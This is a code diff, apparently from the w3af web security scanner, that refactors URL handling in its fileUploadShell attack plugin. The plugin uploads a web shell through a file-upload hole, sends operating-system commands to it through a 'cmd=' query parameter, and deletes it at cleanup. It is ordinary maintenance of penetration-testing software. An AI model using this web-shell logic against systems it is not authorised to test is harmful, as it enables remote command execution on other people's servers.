@@ -31,8 +31,8 @@ from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
 import core.data.kb.knowledgeBase as kb
 import core.data.kb.vuln as vuln
 from core.data.kb.exec_shell import exec_shell as exec_shell
+from core.data.parsers.urlParser import parse_qs
 
-import core.data.parsers.urlParser as urlParser
 from core.controllers.w3afException import w3afException
 import plugins.attack.payloads.shell_handler as shell_handler
 from plugins.attack.payloads.decorators.exec_decorator import exec_debug
@@ -127,7 +127,7 @@ class fileUploadShell(baseAttackPlugin):
         exploit_dc = vuln_obj.getDc()
 
         # Create a file that will be uploaded
-        extension = urlParser.getExtension( url )
+        extension = url.getExtension()
         fname = self._create_file( extension )
         file_handler = open( fname , "r")
         
@@ -145,7 +145,8 @@ class fileUploadShell(baseAttackPlugin):
             # Call the uploaded script with an empty value in cmd parameter
             # this will return the shell_handler.SHELL_IDENTIFIER if success
             dst = vuln_obj['fileDest']
-            self._exploit = urlParser.getDomainPath( dst ) + self._file_name + '?cmd='
+            self._exploit = dst.getDomainPath().urlJoin( self._file_name )
+            self._exploit.setQueryString( 'cmd=' )
             response = self._urlOpener.GET( self._exploit )
             
             # Clean-up
@@ -218,7 +219,7 @@ class fileUploadShell(baseAttackPlugin):
         ''' 
         self._url = optionsMap['url'].getValue()
         self._method = optionsMap['method'].getValue()
-        self._data = urlParser.getQueryString( optionsMap['data'].getValue() )
+        self._data = parse_qs( optionsMap['data'].getValue() )
         self._fileVars = optionsMap['fileVars'].getValue()
         self._fileDest = optionsMap['fileDest'].getValue()
 
@@ -268,13 +269,14 @@ class fuShell(exec_shell):
         @parameter command: The command to handle ( ie. "read", "exec", etc ).
         @return: The result of the command.
         '''
-        to_send = self.getExploitURL() + urllib.quote_plus( command )
+        to_send = self.getExploitURL()
+        to_send.setQueryString( parse_qs('cmd=' + command ) )
         response = self._urlOpener.GET( to_send )
         return response.getBody()
         
     def end( self ):
         om.out.debug('File upload shell is going to delete the webshell that was uploaded before.')
-        file_to_del = urlParser.getFileName( self.getExploitURL() )
+        file_to_del = self.getExploitURL().getFileName()
         try:
             self.unlink(file_to_del)
         except w3afException, e:
